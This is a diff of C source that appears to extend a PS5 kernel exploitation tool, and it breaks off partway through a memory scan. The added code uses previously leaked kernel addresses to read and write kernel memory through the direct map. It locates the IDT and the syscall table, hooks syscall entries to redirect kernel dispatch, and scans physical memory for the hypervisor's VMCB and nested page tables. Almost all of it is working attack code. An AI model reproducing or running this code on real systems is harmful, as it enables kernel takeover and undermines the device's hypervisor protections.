@@ -1485,6 +1485,2092 @@ static int build_ring0_apic_writeback_shellcode(uint8_t *buf, int bufmax,
     return p;
 }
 
+
+/* ─── Ring-0 Execution Chain (standalone, no kmod dependency) ─── */
+static void campaign_ring0_execution(void) {
+    printf("\n=============================================\n");
+    printf("  Campaign: Ring-0 Execution Chain\n");
+    printf("=============================================\n\n");
+
+    if (!g_dmap_base || !g_kdata_base || !g_ktext_base || !g_cr3_phys) {
+        printf("[-] Missing kernel addresses — cannot proceed.\n");
+        printf("    dmap=0x%lx kdata=0x%lx ktext=0x%lx cr3=0x%lx\n",
+               (unsigned long)g_dmap_base, (unsigned long)g_kdata_base,
+               (unsigned long)g_ktext_base, (unsigned long)g_cr3_phys);
+        return;
+    }
+
+    /* Step 1: Allocate shared memory buffer for ring-0 shellcode results.
+     * We allocate physically-contiguous direct memory and compute
+     * its kernel VA via DMAP. Ring-0 shellcode writes results here. */
+    printf("[*] Step 1: Allocating shared result buffer...\n");
+
+    #define RING0_RESULT_ALLOC_SIZE 0x4000  /* 16KB */
+    off_t result_phys = 0;
+    void *result_vaddr = NULL;
+
+    int ret = sceKernelAllocateDirectMemory(
+        0, 0x180000000ULL,
+        RING0_RESULT_ALLOC_SIZE, 0x4000,
+        SCE_KERNEL_WB_ONION,
+        &result_phys
+    );
+    if (ret != 0) {
+        printf("[-] sceKernelAllocateDirectMemory failed: 0x%x\n", ret);
+        return;
+    }
+
+    ret = sceKernelMapDirectMemory(
+        &result_vaddr, RING0_RESULT_ALLOC_SIZE,
+        SCE_KERNEL_PROT_CPU_RW,
+        0, result_phys, 0x4000
+    );
+    if (ret != 0) {
+        printf("[-] sceKernelMapDirectMemory failed: 0x%x\n", ret);
+        return;
+    }
+
+    memset(result_vaddr, 0, RING0_RESULT_ALLOC_SIZE);
+
+    /*
+     * The PA from sceKernelAllocateDirectMemory is a PS5 bus address,
+     * NOT a CPU physical address. DMAP maps CPU physical addresses.
+     * Walk the page tables to find the actual CPU PA backing our mapping.
+     */
+    uint64_t cpu_pa = va_to_cpu_pa((uint64_t)result_vaddr);
+    printf("[+] Result buffer: userland VA=0x%lx\n", (unsigned long)result_vaddr);
+    printf("    Direct memory PA: 0x%lx (PS5 bus address)\n", (unsigned long)result_phys);
+    printf("    CPU physical PA:  0x%lx (from page table walk)\n", (unsigned long)cpu_pa);
+
+    if (cpu_pa == 0) {
+        printf("[-] Page table walk failed - cannot resolve CPU physical address.\n");
+        return;
+    }
+
+    uint64_t result_kva = g_dmap_base + cpu_pa;
+    printf("    DMAP kernel VA:   0x%lx\n", (unsigned long)result_kva);
+
+    /* Verify: write a test pattern via userland, read via kernel_copyout */
+    volatile uint64_t *test_ptr = (volatile uint64_t *)result_vaddr;
+    *test_ptr = 0xBEEFCAFE12345678ULL;
+    uint64_t verify;
+    kernel_copyout(result_kva, &verify, sizeof(verify));
+    printf("[*] DMAP verify: wrote 0xbeefcafe12345678, read back 0x%lx %s\n",
+           (unsigned long)verify,
+           verify == 0xBEEFCAFE12345678ULL ? "[OK]" : "[MISMATCH]");
+    *test_ptr = 0; /* Clear test pattern */
+
+    if (verify != 0xBEEFCAFE12345678ULL) {
+        printf("[-] DMAP address verification failed!\n");
+        printf("    The page table walk may have returned an incorrect PA.\n");
+        return;
+    }
+
+    /* 4d-1: sysarch-based FS/GS BASE reads
+     * sysarch(2) = syscall 165, subcommands:
+     *   128 = AMD64_GET_FSBASE
+     *   130 = AMD64_GET_GSBASE */
+    {
+        #define SYS_sysarch     165
+        #define AMD64_GET_FSBASE 128
+        #define AMD64_GET_GSBASE 130
+        uint64_t fs_base = 0, gs_base = 0;
+        int sa_ret;
+        sa_ret = syscall(SYS_sysarch, AMD64_GET_FSBASE, &fs_base);
+        printf("[*] sysarch(GET_FSBASE): ret=%d, value=0x%lx\n",
+               sa_ret, (unsigned long)fs_base);
+        sa_ret = syscall(SYS_sysarch, AMD64_GET_GSBASE, &gs_base);
+        printf("[*] sysarch(GET_GSBASE): ret=%d, value=0x%lx\n",
+               sa_ret, (unsigned long)gs_base);
+    }
+
+    /* 4d-2: Known values from exploit setup */
+    printf("[*] Known from exploit:\n");
+    printf("    ktext_base  = 0x%lx\n", (unsigned long)g_ktext_base);
+    printf("    kdata_base  = 0x%lx\n", (unsigned long)g_kdata_base);
+    printf("    dmap_base   = 0x%lx\n", (unsigned long)g_dmap_base);
+    printf("    CR3 (phys)  = 0x%lx\n", (unsigned long)g_cr3_phys);
+    fflush(stdout);
+
+    /* 4d-3: IDT handler addresses
+     * SIDT is intercepted by PS5 HV (VMCB intercept bit) and kills
+     * the process.  Find IDT by scanning kdata via DMAP instead.
+     * (Direct kernel_copyout from KVA fails on many kdata pages;
+     *  DMAP reads after page table walk always succeed.)
+     *
+     * IDT = 256 × 16-byte gate descriptors:
+     *   +0: uint16 offset_lo   +2: uint16 selector (kernel CS)
+     *   +4: uint8 ist          +5: uint8 type_attr (0x8E=int, 0x8F=trap)
+     *   +6: uint16 offset_mid  +8: uint32 offset_hi  +12: uint32 reserved(0) */
+    {
+        printf("[*] Searching kdata for IDT via DMAP (SIDT is HV-intercepted)...\n");
+        fflush(stdout);
+
+        uint64_t idt_kva = 0;
+        uint16_t idt_sel = 0;
+        uint8_t idt_pg[4096];
+        int pages_ok = 0, pages_fail = 0;
+
+        /* Scan first 128MB of kdata via DMAP.
+         * Relaxed criteria: accept any kernel VA handler (>= 0xffffffff80000000),
+         * selector up to 0x80, to account for PS5's custom GDT. */
+        int best_run = 0;
+        uint64_t best_run_off = 0;
+        for (uint64_t off = 0; off < 0x8000000 && !idt_kva; off += 4096) {
+            /* Progress every 16MB (4096 pages) */
+            if ((off & 0xFFFFFF) == 0 && off > 0) {
+                printf("    IDT scan: %luMB/%dMB (%d pages OK, %d fail)\n",
+                       (unsigned long)(off >> 20), 128, pages_ok, pages_fail);
+                fflush(stdout);
+            }
+            uint64_t kva = g_kdata_base + off;
+            uint64_t pa = va_to_pa_quiet(kva);
+            if (!pa || pa >= MAX_SAFE_PA) { pages_fail++; continue; }
+            if (kernel_copyout(g_dmap_base + pa, idt_pg, 4096) != 0) {
+                pages_fail++; continue;
+            }
+            pages_ok++;
+
+            for (int boff = 0; boff <= 4096 - 16*8 && !idt_kva; boff += 16) {
+                int good = 0;
+                uint16_t first_sel = 0;
+                for (int e = 0; e < 8; e++) {
+                    uint8_t *g = &idt_pg[boff + e * 16];
+                    uint16_t lo, sel, mid;
+                    uint32_t hi, rsv;
+                    uint8_t type_attr;
+                    memcpy(&lo,  g + 0, 2);
+                    memcpy(&sel, g + 2, 2);
+                    type_attr = g[5];
+                    memcpy(&mid, g + 6, 2);
+                    memcpy(&hi,  g + 8, 4);
+                    memcpy(&rsv, g + 12, 4);
+                    uint64_t h = (uint64_t)lo | ((uint64_t)mid << 16) |
+                                 ((uint64_t)hi << 32);
+                    /* Relaxed: any kernel VA, selector up to 0x80 */
+                    if (h >= 0xffffffff80000000ULL &&
+                        (type_attr == 0x8E || type_attr == 0x8F) &&
+                        sel != 0 && sel <= 0x80 && (sel & 7) == 0 &&
+                        rsv == 0) {
+                        good++;
+                        if (first_sel == 0) first_sel = sel;
+                    }
+                }
+                if (good > best_run) {
+                    best_run = good;
+                    best_run_off = off + boff;
+                }
+                if (good >= 6) {
+                    idt_kva = kva + boff;
+                    idt_sel = first_sel;
+                }
+            }
+        }
+
+        printf("    (scanned %d pages, %d unmapped, best gate run=%d at kdata+0x%lx)\n",
+               pages_ok, pages_fail, best_run, (unsigned long)best_run_off);
+
+        if (idt_kva) {
+            printf("[+] IDT found at kdata+0x%lx (KVA 0x%lx), kernel CS=0x%x\n",
+                   (unsigned long)(idt_kva - g_kdata_base),
+                   (unsigned long)idt_kva, idt_sel);
+
+            static const struct { int vec; const char *name; } idt_vecs[] = {
+                {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
+                {6, "#UD"}, {8, "#DF"}, {13, "#GP"}, {14, "#PF"},
+                {32, "Timer"}, {128, "int80"},
+            };
+            for (unsigned i = 0; i < sizeof(idt_vecs)/sizeof(idt_vecs[0]); i++) {
+                int v = idt_vecs[i].vec;
+                uint64_t gate_kva = idt_kva + v * 16;
+                uint64_t gate_pa = va_to_pa_quiet(gate_kva);
+                uint8_t g[16];
+                if (!gate_pa || kernel_copyout(g_dmap_base + gate_pa, g, 16) != 0) {
+                    printf("    IDT[%3d] %-6s — read failed\n", v, idt_vecs[i].name);
+                    continue;
+                }
+                uint16_t lo, sel, mid;
+                uint32_t hi;
+                memcpy(&lo,  g + 0, 2);
+                memcpy(&sel, g + 2, 2);
+                memcpy(&mid, g + 6, 2);
+                memcpy(&hi,  g + 8, 4);
+                uint64_t handler = (uint64_t)lo | ((uint64_t)mid << 16) |
+                                   ((uint64_t)hi << 32);
+                printf("    IDT[%3d] %-6s = 0x%lx (ktext+0x%lx) sel=0x%x\n",
+                       v, idt_vecs[i].name, (unsigned long)handler,
+                       (unsigned long)(handler - g_ktext_base), sel);
+            }
+        } else {
+            printf("[-] IDT not found in kdata (first 128MB).\n");
+        }
+        fflush(stdout);
+    }
+
+    /* Variables hoisted for use by sysent dump, verification, and
+     * ring-0 execution */
+    int sysent_found = 0;
+    int sysent_verified = 0;
+    uint64_t sysent_kva = 0;
+
+    /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
+    {
+        /* struct sysent (0x30 = 48 bytes, confirmed via etaHEN kexec.h):
+         *   0x00: uint32_t n_arg
+         *   0x04: uint32_t pad
+         *   0x08: uint64_t sy_call       (function pointer in ktext)
+         *   0x10: uint64_t sy_auevent
+         *   0x18: uint64_t sy_systrace_args
+         *   0x20: uint32_t sy_entry
+         *   0x24: uint32_t sy_return
+         *   0x28: uint32_t sy_flags
+         *   0x2C: uint32_t sy_thrcnt
+         *
+         * sysentvec for FW 4.03 is at kdata+0xd11bb8 (from etaHEN offsets).
+         *
+         * IMPORTANT: etaHEN daemon's pause_resume_kstuff() writes
+         * 0xdeb7 or 0xffff at sysentvec+14, which corrupts the
+         * top 16 bits of sv_table (at struct offset 8, bytes 14-15).
+         * We must reconstruct the canonical pointer by forcing
+         * bits 48-63 back to 0xFFFF. */
+        printf("[*] Looking up sysent via known sysentvec offset...\n");
+        fflush(stdout);
+
+        #define SYSENT_STRIDE 0x30  /* 48 bytes per entry */
+
+        /* Read sysentvec at known offset via DMAP */
+        uint64_t sysentvec_kva = g_kdata_base + 0xd11bb8;
+        uint64_t sysentvec_pa = va_to_pa_quiet(sysentvec_kva);
+
+        if (sysentvec_pa) {
+            uint8_t svec[24];
+            kernel_copyout(g_dmap_base + sysentvec_pa, svec, 24);
+
+            /* Dump raw bytes for diagnostics */
+            printf("    sysentvec raw (24 bytes at PA 0x%lx):\n      ",
+                   (unsigned long)sysentvec_pa);
+            for (int i = 0; i < 24; i++)
+                printf("%02x ", svec[i]);
+            printf("\n");
+
+            int32_t sv_size;
+            uint64_t sv_table_raw;
+            memcpy(&sv_size, svec, 4);
+            memcpy(&sv_table_raw, svec + 8, 8);
+
+            /* etaHEN daemon corrupts bytes 14-15 (top 16 bits of sv_table)
+             * with 0xdeb7 (unpaused) or 0xffff (paused).
+             * Reconstruct canonical kernel pointer. */
+            uint64_t sv_table = (sv_table_raw & 0x0000FFFFFFFFFFFFULL)
+                              | 0xFFFF000000000000ULL;
+
+            printf("    sv_size=%d, sv_table_raw=0x%lx → fixed=0x%lx\n",
+                   sv_size, (unsigned long)sv_table_raw,
+                   (unsigned long)sv_table);
+
+            /* Also check offset-14 toggle value */
+            uint16_t toggle;
+            memcpy(&toggle, svec + 14, 2);
+            printf("    offset+14 toggle=0x%04x (%s)\n", toggle,
+                   toggle == 0xdeb7 ? "unpaused/etaHEN active" :
+                   toggle == 0xffff ? "paused/normal" : "unknown");
+
+            if (sv_size >= 300 && sv_size <= 1024 &&
+                sv_table >= g_kdata_base &&
+                sv_table < g_kdata_base + 0x4000000) {
+                sysent_kva = sv_table;
+                sysent_found = 1;
+                printf("[+] Sysent table at KVA 0x%lx (kdata+0x%lx), %d entries\n",
+                       (unsigned long)sysent_kva,
+                       (unsigned long)(sysent_kva - g_kdata_base), sv_size);
+            } else {
+                printf("    Reconstructed sv_table out of range — trying scan.\n");
+            }
+        } else {
+            printf("    sysentvec VA 0x%lx not mapped — trying scan.\n",
+                   (unsigned long)sysentvec_kva);
+        }
+
+        /* Fallback: scan kdata via DMAP for narg pattern */
+        if (!sysent_found) {
+            printf("[*] Scanning kdata for sysent table via DMAP...\n");
+            fflush(stdout);
+
+            /* FreeBSD syscall nargs for entries 0-6:
+             *   0=nosys(0), 1=exit(1), 2=fork(0),
+             *   3=read(3), 4=write(3), 5=open(3), 6=close(1) */
+            static const int expected_nargs[] = {0, 1, 0, 3, 3, 3, 1};
+            int match_size = SYSENT_STRIDE * 7;
+            uint8_t blk[4096];
+            int pages_ok = 0, pages_fail = 0;
+
+            for (uint64_t pg = 0; pg < 0x4000000 && !sysent_found; pg += 4096) {
+                uint64_t kva = g_kdata_base + pg;
+                uint64_t pa = va_to_pa_quiet(kva);
+                if (!pa) { pages_fail++; continue; }
+                if (kernel_copyout(g_dmap_base + pa, blk, 4096) != 0) {
+                    pages_fail++; continue;
+                }
+                pages_ok++;
+
+                for (int boff = 0; boff <= 4096 - match_size && !sysent_found; boff += 8) {
+                    int match = 1;
+                    for (int i = 0; i < 7 && match; i++) {
+                        int32_t narg;
+                        memcpy(&narg, &blk[boff + i * SYSENT_STRIDE], 4);
+                        if (narg != expected_nargs[i]) match = 0;
+                    }
+                    if (match) {
+                        uint64_t call0;
+                        memcpy(&call0, &blk[boff + 8], 8);
+                        if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
+                            sysent_kva = kva + boff;
+                            sysent_found = 1;
+                        }
+                    }
+                }
+            }
+            if (!sysent_found)
+                printf("[-] Sysent not found (scanned %d pages, %d unmapped).\n",
+                       pages_ok, pages_fail);
+        }
+
+        if (sysent_found) {
+            /* Dump key syscalls via DMAP reads */
+            printf("[*] Key sysent entries (sy_narg, sy_call -> ktext offset):\n");
+            static const struct { int num; const char *name; } key_syscalls[] = {
+                {0, "nosys"}, {1, "exit"}, {2, "fork"}, {3, "read"},
+                {4, "write"}, {5, "open"}, {6, "close"},
+                {20, "getpid"}, {37, "kill"}, {54, "ioctl"},
+                {59, "execve"}, {73, "munmap"}, {74, "mprotect"},
+                {165, "sysarch"}, {202, "sysctl"},
+                {304, "kldload"}, {305, "kldunload"}, {308, "kldstat"},
+                {477, "mmap"}, {337, "kldsym"},
+            };
+            for (unsigned i = 0; i < sizeof(key_syscalls)/sizeof(key_syscalls[0]); i++) {
+                int num = key_syscalls[i].num;
+                uint64_t ent_kva = sysent_kva + (uint64_t)num * SYSENT_STRIDE;
+                uint64_t ent_pa = va_to_pa_quiet(ent_kva);
+                uint8_t entry[SYSENT_STRIDE];
+                int32_t narg = -1;
+                uint64_t sy_call = 0;
+                if (ent_pa) {
+                    kernel_copyout(g_dmap_base + ent_pa, entry, SYSENT_STRIDE);
+                    memcpy(&narg, entry, 4);
+                    memcpy(&sy_call, entry + 8, 8);
+                }
+                printf("    [%3d] %-12s narg=%d  sy_call=0x%lx (ktext+0x%lx)\n",
+                       num, key_syscalls[i].name, narg,
+                       (unsigned long)sy_call,
+                       (unsigned long)(sy_call - g_ktext_base));
+            }
+        }
+        fflush(stdout);
+    }
+
+    /* 4d-5: Sysent verification and live hook test */
+    if (sysent_found) {
+        printf("\n[*] Verifying sysent table...\n");
+        fflush(stdout);
+
+        /* Get nosys handler address (entry 0) */
+        uint64_t nosys_call = 0;
+        {
+            uint64_t pa = va_to_pa_quiet(sysent_kva + 8);
+            if (pa) kernel_copyout(g_dmap_base + pa, &nosys_call, 8);
+        }
+
+        /* Cross-check narg values for known syscalls */
+        static const struct { int num; int narg; const char *name; } verify[] = {
+            {20, 0, "getpid"}, {37, 2, "kill"}, {54, 3, "ioctl"},
+            {59, 3, "execve"}, {73, 2, "munmap"}, {74, 3, "mprotect"},
+            {165, 2, "sysarch"}, {202, 6, "sysctl"}, {477, 6, "mmap"},
+            {304, 1, "kldload"}, {305, 1, "kldunload"}, {308, 2, "kldstat"},
+        };
+        int narg_ok = 0, narg_total = 0;
+        for (unsigned i = 0; i < sizeof(verify)/sizeof(verify[0]); i++) {
+            uint64_t ent_kva = sysent_kva + (uint64_t)verify[i].num * SYSENT_STRIDE;
+            uint64_t pa = va_to_pa_quiet(ent_kva);
+            if (!pa) continue;
+            int32_t narg;
+            kernel_copyout(g_dmap_base + pa, &narg, 4);
+            narg_total++;
+            if (narg == verify[i].narg) narg_ok++;
+            else printf("    MISMATCH: %s narg=%d expected=%d\n",
+                        verify[i].name, narg, verify[i].narg);
+        }
+        printf("    narg cross-check: %d/%d matched\n", narg_ok, narg_total);
+
+        /* Count nosys entries in high range (600-723) */
+        int nosys_cnt = 0, checked = 0;
+        for (int i = 600; i < 724; i++) {
+            uint64_t pa = va_to_pa_quiet(sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
+            if (!pa) continue;
+            uint64_t call;
+            kernel_copyout(g_dmap_base + pa, &call, 8);
+            checked++;
+            if (call == nosys_call) nosys_cnt++;
+        }
+        printf("    nosys consistency: %d/%d high entries point to nosys (0x%lx)\n",
+               nosys_cnt, checked, (unsigned long)nosys_call);
+
+        /* 12/12 narg match is strong proof. PS5 has ~117 custom Sony
+         * syscalls in 600-723, so nosys count is just informational. */
+        sysent_verified = (narg_ok == narg_total && narg_total >= 10);
+        if (sysent_verified)
+            printf("[+] Sysent table VERIFIED (12/12 narg match)!\n");
+        else
+            printf("[-] Sysent verification failed (%d/%d narg).\n",
+                   narg_ok, narg_total);
+        fflush(stdout);
+
+        /* Live hook test: redirect an unused syscall to getpid handler */
+        if (sysent_verified) {
+            /* Find an unused (nosys) syscall — scan wide range */
+            int test_sc = -1;
+            for (int i = 723; i >= 500; i--) {
+                uint64_t pa = va_to_pa_quiet(
+                    sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
+                if (!pa) continue;
+                uint64_t call;
+                kernel_copyout(g_dmap_base + pa, &call, 8);
+                if (call == nosys_call) { test_sc = i; break; }
+            }
+
+            if (test_sc >= 0) {
+                printf("\n[*] Live sysent hook test: syscall %d\n", test_sc);
+
+                uint64_t ent_kva = sysent_kva + (uint64_t)test_sc * SYSENT_STRIDE;
+
+                /* Save original entry */
+                uint8_t orig_ent[SYSENT_STRIDE];
+                uint64_t ent_pa = va_to_pa_quiet(ent_kva);
+                kernel_copyout(g_dmap_base + ent_pa, orig_ent, SYSENT_STRIDE);
+
+                /* Read & display original sy_call */
+                uint64_t orig_call = 0;
+                uint64_t call_pa = va_to_pa_quiet(ent_kva + 8);
+                kernel_copyout(g_dmap_base + call_pa, &orig_call, 8);
+                printf("    Original sy_call: 0x%lx (nosys=0x%lx, match=%s)\n",
+                       (unsigned long)orig_call, (unsigned long)nosys_call,
+                       orig_call == nosys_call ? "YES" : "NO");
+
+                /* Call before modification */
+                errno = 0;
+                long ret0 = syscall(test_sc);
+                int err0 = errno;
+                printf("    Before: syscall(%d) = %ld, errno=%d (%s)\n",
+                       test_sc, ret0, err0,
+                       err0 == 78 ? "ENOSYS" : "other");
+
+                /* Get getpid sy_call address */
+                uint64_t getpid_pa = va_to_pa_quiet(
+                    sysent_kva + 20ULL * SYSENT_STRIDE + 8);
+                uint64_t getpid_call = 0;
+                kernel_copyout(g_dmap_base + getpid_pa, &getpid_call, 8);
+                printf("    getpid sy_call: 0x%lx\n",
+                       (unsigned long)getpid_call);
+
+                /* Write getpid handler into test syscall via DMAP */
+                kernel_copyin(&getpid_call, g_dmap_base + call_pa, 8);
+
+                /* Also set narg=0 to match getpid */
+                int32_t zero = 0;
+                uint64_t narg_pa = va_to_pa_quiet(ent_kva);
+                kernel_copyin(&zero, g_dmap_base + narg_pa, 4);
+
+                /* Read back to verify the DMAP write stuck */
+                uint64_t readback = 0;
+                kernel_copyout(g_dmap_base + call_pa, &readback, 8);
+                int write_ok = (readback == getpid_call);
+                printf("    DMAP write verify: wrote 0x%lx, read back 0x%lx [%s]\n",
+                       (unsigned long)getpid_call, (unsigned long)readback,
+                       write_ok ? "OK" : "MISMATCH");
+
+                /* Call after modification — should return our PID */
+                errno = 0;
+                long ret1 = syscall(test_sc);
+                int err1 = errno;
+                pid_t real_pid = getpid();
+                printf("    After:  syscall(%d) = %ld, errno=%d (real pid=%d)\n",
+                       test_sc, ret1, err1, real_pid);
+
+                if (ret1 == real_pid && err1 == 0) {
+                    printf("[+] SYSENT HOOK VERIFIED — full syscall dispatch control!\n");
+                } else if (write_ok && ret1 == ret0) {
+                    /* Write succeeded but behavior unchanged —
+                     * something else dispatches before sysent */
+                    printf("[-] DMAP write verified but syscall behavior UNCHANGED.\n");
+                    printf("    ret before=%ld, after=%ld (identical)\n", ret0, ret1);
+                    printf("    etaHEN syscall wrapper likely intercepts before sysent.\n");
+                    printf("[*] Investigating etaHEN dispatch path...\n");
+                    fflush(stdout);
+
+                    /* Dump the sysentvec structure for more context */
+                    uint64_t sv_pa = va_to_pa_quiet(
+                        g_kdata_base + 0x1401bb8ULL);
+                    if (sv_pa) {
+                        uint8_t sv_raw[64];
+                        kernel_copyout(g_dmap_base + sv_pa, sv_raw, 64);
+                        printf("    sysentvec[0..63]:\n      ");
+                        for (int j = 0; j < 64; j++) {
+                            printf("%02x ", sv_raw[j]);
+                            if ((j & 15) == 15) printf("\n      ");
+                        }
+                        printf("\n");
+                        /* sv_fixup is at offset 48 (syscall entry func ptr) */
+                        uint64_t sv_fixup = 0;
+                        memcpy(&sv_fixup, sv_raw + 48, 8);
+                        printf("    sv_fixup (offset 48): 0x%lx",
+                               (unsigned long)sv_fixup);
+                        if (sv_fixup >= g_ktext_base &&
+                            sv_fixup < g_ktext_base + 0x2000000ULL)
+                            printf(" (ktext+0x%lx)",
+                                   (unsigned long)(sv_fixup - g_ktext_base));
+                        printf("\n");
+                    }
+
+                    /* SAFE reverse test: hook a real but rarely-used syscall
+                     * to getpid handler. If the result changes from its normal
+                     * return value to our PID, sysent IS the dispatch table
+                     * for standard syscalls.
+                     *
+                     * IMPORTANT: Do NOT hook getpid->nosys! That crashes the PS5
+                     * because every kernel thread calling getpid() would hit nosys,
+                     * causing cascading failures and a hard freeze.
+                     *
+                     * Using issetugid (syscall 253): returns 0 or 1 normally,
+                     * narg=0. If hooked to getpid handler, should return our PID.
+                     * Rarely called by kernel threads, so safe to modify briefly. */
+                    printf("[*] Safe reverse test: hook sysent[253] (issetugid) to getpid...\n");
+                    fflush(stdout);
+
+                    /* Read original issetugid entry */
+                    uint64_t issu_ent_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
+                    uint64_t issu_call_pa = va_to_pa_quiet(issu_ent_kva + 8);
+                    uint64_t issu_narg_pa = va_to_pa_quiet(issu_ent_kva);
+                    uint64_t issu_orig_call = 0;
+                    int32_t issu_orig_narg = 0;
+                    if (issu_call_pa && issu_narg_pa) {
+                        kernel_copyout(g_dmap_base + issu_call_pa, &issu_orig_call, 8);
+                        kernel_copyout(g_dmap_base + issu_narg_pa, &issu_orig_narg, 4);
+                    }
+                    printf("    sysent[253] original: sy_call=0x%lx, narg=%d\n",
+                           (unsigned long)issu_orig_call, issu_orig_narg);
+
+                    if (!issu_call_pa || issu_orig_call == 0) {
+                        printf("[-] Can't read sysent[253], skipping reverse test.\n");
+                    } else {
+                        /* Call issetugid before hook */
+                        errno = 0;
+                        long issu_before = syscall(253);
+                        int issu_err0 = errno;
+                        printf("    Before hook: issetugid()=%ld, errno=%d\n",
+                               issu_before, issu_err0);
+
+                        /* Save full entry for restore */
+                        uint8_t issu_orig_ent[SYSENT_STRIDE];
+                        uint64_t issu_ent_pa = va_to_pa_quiet(issu_ent_kva);
+                        kernel_copyout(g_dmap_base + issu_ent_pa,
+                                       issu_orig_ent, SYSENT_STRIDE);
+
+                        /* Write getpid handler into issetugid */
+                        kernel_copyin(&getpid_call, g_dmap_base + issu_call_pa, 8);
+                        /* Set narg=0 to match getpid */
+                        int32_t zero_narg = 0;
+                        kernel_copyin(&zero_narg, g_dmap_base + issu_narg_pa, 4);
+
+                        /* Verify write */
+                        uint64_t issu_rb = 0;
+                        kernel_copyout(g_dmap_base + issu_call_pa, &issu_rb, 8);
+                        printf("    After write: sy_call=0x%lx (%s)\n",
+                               (unsigned long)issu_rb,
+                               issu_rb == getpid_call ? "OK" : "MISMATCH");
+
+                        /* Call issetugid after hook — should return PID */
+                        errno = 0;
+                        long issu_after = syscall(253);
+                        int issu_err1 = errno;
+                        printf("    After hook:  issetugid()=%ld, errno=%d (pid=%d)\n",
+                               issu_after, issu_err1, real_pid);
+
+                        /* Restore IMMEDIATELY */
+                        kernel_copyin(issu_orig_ent,
+                                      g_dmap_base + issu_ent_pa, SYSENT_STRIDE);
+                        printf("    Restored sysent[253]\n");
+
+                        if (issu_after == (long)real_pid && issu_err1 == 0) {
+                            printf("[+] SYSENT HOOK CONFIRMED for standard syscalls!\n");
+                            printf("    Kernel dispatches real syscalls through sysent.\n");
+                            printf("    etaHEN only intercepts high/custom syscalls.\n");
+                            printf("    This means: hook any standard sysent entry\n");
+                            printf("    → execution redirected to chosen kernel function.\n");
+                        } else if (issu_after == issu_before &&
+                                   issu_err1 == issu_err0) {
+                            printf("[-] issetugid unchanged — etaHEN intercepts all.\n");
+                        } else {
+                            printf("[?] Unexpected: before=%ld, after=%ld\n",
+                                   issu_before, issu_after);
+                            printf("    Partial sysent dispatch? Needs investigation.\n");
+                        }
+                    }
+                } else if (!write_ok) {
+                    printf("[-] DMAP write FAILED — sysent page is write-protected.\n");
+                } else {
+                    printf("[-] Sysent hook result unexpected: ret=%ld, errno=%d\n",
+                           ret1, err1);
+                    printf("    Write verified OK but behavior unclear.\n");
+                }
+
+                /* Restore original entry */
+                kernel_copyin(orig_ent, g_dmap_base + ent_pa, SYSENT_STRIDE);
+                printf("    Restored sysent[%d]\n", test_sc);
+                fflush(stdout);
+            } else {
+                printf("[-] No unused nosys syscall found in 500-723.\n");
+            }
+        }
+    }
+
+    /* ================================================================
+     * NPT (Nested Page Table) Discovery Scan
+     * ================================================================
+     * Goal: Find the PS5 hypervisor's page table structures that
+     * enforce W^X on kernel memory.  Entirely read-only via DMAP.
+     *
+     * Strategy:
+     *   1. Scan guest physical memory for VMCB (contains nCR3 = NPT root)
+     *      - VMCB has guest CR3 at save-state offset 0x580
+     *   2. Scan for page table pages referencing known kdata/ktext PAs
+     *   3. Map out which PA ranges are guest-accessible vs HV-protected
+     *
+     * AMD NPT entry format (8 bytes):
+     *   Bit 0:     Present
+     *   Bit 1:     Read/Write
+     *   Bit 2:     User/Supervisor
+     *   Bit 7:     Page Size (2MB at PD level)
+     *   Bits 12-51: Physical page frame number
+     *   Bit 63:    NX (No Execute)
+     * ================================================================ */
+    {
+        printf("\n=============================================\n");
+        printf("  NPT Discovery: HV Page Table Scan\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        /* Get known physical addresses for signature matching */
+        uint64_t ktext_pa = va_to_pa_quiet(g_ktext_base);
+        uint64_t kdata_pa = va_to_pa_quiet(g_kdata_base);
+        uint64_t ktext_2mb = ktext_pa & ~0x1FFFFFULL;
+        uint64_t kdata_2mb = kdata_pa & ~0x1FFFFFULL;
+
+        printf("[*] Search signatures:\n");
+        printf("    ktext PA  = 0x%lx (2MB page: 0x%lx)\n",
+               (unsigned long)ktext_pa, (unsigned long)ktext_2mb);
+        printf("    kdata PA  = 0x%lx (2MB page: 0x%lx)\n",
+               (unsigned long)kdata_pa, (unsigned long)kdata_2mb);
+        printf("    Guest CR3 = 0x%lx\n", (unsigned long)g_cr3_phys);
+        printf("    Scan range: PA 0x0 → 0x20000000 (512MB)\n");
+        fflush(stdout);
+
+        uint8_t scan_pg[4096];
+        int npt_ok = 0, npt_fail = 0;
+        int vmcb_found = 0;
+        int pt_pages_with_refs = 0;
+        /* Track which 2MB regions are accessible vs blocked */
+        int accessible_2mb = 0, blocked_2mb = 0;
+        uint64_t first_blocked = 0, last_blocked = 0;
+
+        /* Phase 1: Scan for VMCB and PT structures */
+        for (uint64_t pa = 0; pa < 0x20000000ULL; pa += 0x1000) {
+            /* Progress every 64MB */
+            if ((pa & 0x3FFFFFF) == 0 && pa > 0) {
+                printf("    Scan: %luMB/512MB (%d OK, %d blocked, "
+                       "%d PT refs found)\n",
+                       (unsigned long)(pa >> 20), npt_ok, npt_fail,
+                       pt_pages_with_refs);
+                fflush(stdout);
+            }
+
+            /* Track 2MB-region accessibility */
+            if ((pa & 0x1FFFFF) == 0) {
+                /* Test first page of each 2MB region */
+                if (kernel_copyout(g_dmap_base + pa, scan_pg, 8) != 0) {
+                    blocked_2mb++;
+                    if (!first_blocked) first_blocked = pa;
+                    last_blocked = pa;
+                    pa += 0x1FFFFF; /* Skip rest of blocked 2MB region */
+                    npt_fail += 512;
+                    continue;
+                }
+                accessible_2mb++;
+            }
+
+            if (kernel_copyout(g_dmap_base + pa, scan_pg, 4096) != 0) {
+                npt_fail++;
+                continue;
+            }
+            npt_ok++;
+
+            uint64_t *ents = (uint64_t *)scan_pg;
+
+            /* Check for VMCB: guest CR3 at save-state offset 0x580 */
+            if (g_cr3_phys != 0) {
+                uint64_t v580 = 0;
+                memcpy(&v580, scan_pg + 0x580, 8);
+                /* CR3 match (mask out PCID bits in low 12) */
+                if ((v580 & ~0xFFFULL) == (g_cr3_phys & ~0xFFFULL) &&
+                    v580 != 0) {
+                    printf("\n[!] VMCB candidate at PA 0x%lx!\n",
+                           (unsigned long)pa);
+                    printf("    offset 0x580 (CR3): 0x%lx\n",
+                           (unsigned long)v580);
+                    vmcb_found++;
